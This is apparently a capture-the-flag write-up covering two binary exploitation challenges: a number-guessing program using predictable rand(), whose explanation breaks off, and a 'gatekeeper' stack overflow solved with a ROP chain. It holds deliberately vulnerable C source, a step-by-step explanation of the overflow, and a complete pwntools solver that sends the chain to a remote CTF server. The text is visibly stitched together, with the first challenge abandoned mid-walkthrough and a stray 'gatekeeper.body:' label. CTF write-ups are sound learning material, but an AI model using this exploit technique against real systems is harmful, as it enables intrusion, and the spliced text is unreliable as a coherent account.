When the program is executed it asks for the user to guess a number and if the guess is wrong it asks again as shown here : 

![image](img:imv2gku26rw3)

Lets take a look at the source code of the file and see exactly what it does :

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
	return in + 1;
}

long get_random() {
	return rand() % BUFSIZE;
}

int do_stuff() {
	long ans = get_random();
	ans = increment(ans);
	int res = 0;

	printf("What number would you like to guess?\n");
	char guess[BUFSIZE];
	fgets(guess, BUFSIZE, stdin);

	long g = atol(guess);
	if (!g) {
		printf("That's not a valid number!\n");
	} else {
		if (g == ans) {
			printf("Congrats! You win! Your prize is this print statement!\n\n");
			res = 1;
		} else {
			printf("Nope!\n\n");
		}
	}
	return res;
}


void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	// Set the gid to the effective gid
	// this prevents /bin/sh from dropping the privileges
	gid_t gid = getegid();
	setresgid(gid, gid, gid);

	int res;

	printf("Welcome to my guessing game!\n\n");

	while (1) {
		res = do_stuff();
		if (res) {
			win();
		}
	}

	return 0;
}

```
First this to notice here is that the program uses rand() to generate a random number.Let's see how rand() works: 

::note How rand() WorksWhen you call rand(), it runs an algorithm on a starting value called a seed. It returns an integer between 0 and RAND_MAX (at least 32,767) and updates the internal state for the next call.

Because it uses a fixed mathematical formula, calling rand() repeatedly follows a fixed list of numbers. If you run your program multiple times without changing the starting seed, you will get the exact same sequence of "random" numbers every run.

So let's try to guess the number by debugging the binary

gatekeeper.body:
This one’s a straight-up ROP challenge, no format string tricks this time, just a plain stack buffer overflow with a twist, you need to call win() with two specific argument values, not just jump to it.

{u|**Checking the binarys' protection : **}
![image](img:imv7x51729ue)

Interesting!
No pie which means the binary loads at the same address every single time,So we can just get win address and hardcode it in the solver.
`0x0000000000401204  win` i got it just by running the command `info func` in gdb.

{u|**Lets take a look at the source code : **}
`Challenge(void)`
```c

void challenge(void) {
    char buffer[80];
    puts("Present your authorization sequence to the Gatekeeper:");
    // Reads up to 160 bytes into an 80-byte buffer
    read(0, buffer, 160);
}

```
The bug here is that we can write `160` byts in to a `80` bytes long buffer which make it a classic buffer overflow challenge.


`win()`
```c
void win(unsigned long long code1, unsigned long long code2) {
    if (code1 == 0x1337c0deULL && code2 == 0xcafebebeULL) {
        char flag[128];
        FILE *f = fopen("flag.txt", "r");
        if (!f) {
            puts("[-] flag.txt missing! Contact organizers.");
            exit(1);
        }
        if (fgets(flag, sizeof(flag), f)) {
            printf("\n[+] ACCESS GRANTED! Citadel gate unlocked.\n");
            printf("[+] Flag: %s\n", flag);
        }
        fclose(f);
    } else {
        puts("\n[-] ACCESS DENIED! Gate credentials invalid.");
        printf("[-] Received code1: 0x%llx (Expected: 0x1337c0de)\n", code1);
        printf("[-] Received code2: 0x%llx (Expected: 0xcafebebe)\n", code2);
    }
}

```
So it’s not enough to just redirect execution into `win()`, we actually need to control its first two arguments and get them to exact values. On x86-64, the calling convention passes the first two integer args in `rdi` and `rsi`. So we need to:
smash the return address
control rdi → set it to `0x1337c0de`
control rsi → set it to `0xcafebebe`
land on win() 

what made this challenge a lot easier is that the author already gave us the gadgets we need :

```c
// Built-in helper to provide authentic ROP gadgets in small ELF binaries
void gadget_store(void) {
    __asm__(
        "pop %rdi; ret;\n"
        "pop %rsi; pop %r15; ret;\n"
    );
}

```
Lets explain first how these gadgets work : 
`pop rdi; ret` : pops the next value on the stack into `rdi`, then returns (meaning it pops again, this time into the instruction pointer, continuing our chain). This is how we set the first arg.
`pop rsi; pop r15; ret` : same idea but pops into `rsi` and `r15`. `r15` is a throwaway here, we don’t care about it, but we still need to account for the extra pop or the stack alignment gets wrecked and everything after it reads garbage.

{u|**Building the chain :**}
Overflow offset to the saved return address is `88 bytes` (80 for the buffer + 8 for the saved base pointer, standard stack frame padding). After that, it’s just: pop the gadget address, feed it its value, repeat, then finally drop win’s address to call it. 


```c
payload  = b"A" * 88                   # padding to saved return address
payload += p64(pop_rdi_ret)
payload += p64(0x1337c0de)             # code1 -> rdi
payload += p64(pop_rsi_r15_ret)
payload += p64(0xcafebebe)             # code2 -> rsi
payload += p64(0x0)                    # dummy value popped into r15, don't care
payload += p64(win_addr)
```
Walking through what the stack looks like once execution returns into this chain:
return address overwritten → jumps to `pop_rdi_ret`.that pops `0x1337c0de` into `rdi`, then rets into the next thing on the stack next thing is `pop_rsi_r15_ret`, which pops `0xcafebebe` into `rsi` and `0x0` into `r15` (the dummy, just there to keep the gadget’s two pops balanced), then rets again.Next thing on the stack is `win_addr`, so execution jumps straight into `win()` with `rdi` and `rsi` already set exactly how it wants.
By the time `win()` actually runs, both argument checks pass and it reads and prints `flag.txt`.
{u|**Solver.py**} 

```python
from pwn import *

elf = ELF("./gatekeeper")
context.binary = elf
context.log_level = 'debug'
#p=process("./gatekeeper")
p = remote("pwn.securinets-enit.club", 1310)

# Fill these in from your objdump output:
pop_rdi_ret     = 0x4011fb   #addr of "pop rdi; ret"
pop_rsi_r15_ret = 0x00000000004011fd   # addr of "pop rsi; pop r15; ret"
win_addr        = elf.symbols['win']
ret = 0x401016

payload  = b"A" * 88                   # padding to saved return address
payload += p64(pop_rdi_ret)
payload += p64(0x1337c0de)             # code1
payload += p64(pop_rsi_r15_ret)
payload += p64(0xcafebebe)             # code2
payload +=p64(0x0)
payload += p64(win_addr)

p.send(payload)                        # not sendline — avoid adding an extra \n byte
time.sleep(0.5)
p.interactive()

```
Run it, it drops straight into the flag.
